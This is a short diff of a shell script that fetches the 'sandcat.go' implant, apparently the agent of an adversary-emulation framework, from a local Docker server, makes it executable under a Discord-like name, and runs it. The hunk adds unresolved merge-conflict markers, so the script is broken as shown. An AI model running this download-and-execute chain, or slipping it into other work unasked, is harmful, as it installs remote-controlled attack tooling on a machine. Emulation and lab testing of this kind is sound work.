@@ -24,4 +24,8 @@ server="http://host.docker.internal:$PORT";
 
 curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" > "$DISCORD_UID";
 chmod +x "$DISCORD_UID";
+<<<<<<< HEAD
 ./"$DISCORD_UID" -server "$server" -v
+=======
+./"$DISCORD_UID" -server "$server" -v
+>>>>>>> 9b668ab823b68ed51a823f5fb70b8c3acb1a87c6
